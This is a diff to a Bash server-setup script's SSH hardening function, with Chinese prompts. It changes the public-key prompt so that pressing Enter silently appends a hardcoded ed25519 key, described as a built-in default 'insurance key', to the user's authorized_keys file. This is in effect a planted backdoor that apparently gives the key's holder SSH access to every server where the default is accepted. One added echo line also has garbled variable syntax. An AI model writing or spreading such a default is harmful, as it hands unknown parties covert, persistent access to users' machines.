@@ -295,7 +295,13 @@ configure_ssh_security() {
     if [[ -n "$gh_user" ]]; then
         pub_key=$(curl -sSf "https://github.com/${gh_user}.keys")
     else
-        read -p "粘贴公钥（回车跳过）: " pub_key
+        read -p "请粘贴公钥串 (直接回车使用你的内置默认 Key): " input_key
+        if [[ -n "$input_key" ]]; then
+            pub_key="$input_key"
+        else
+            echo -e "$$ {SKYBLUE}>>> 使用内置默认公钥（你的专属保险钥匙） $${PLAIN}"
+            pub_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILdsaJ9MTQU28cyRJZ3s32V1u9YDNUYRJvCSkztBDGsW eddsa-key-20251218"
+        fi
     fi
     [[ -n "$pub_key" ]] && echo "$pub_key" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo -e "${GREEN}✅ 公钥导入成功${PLAIN}"
 
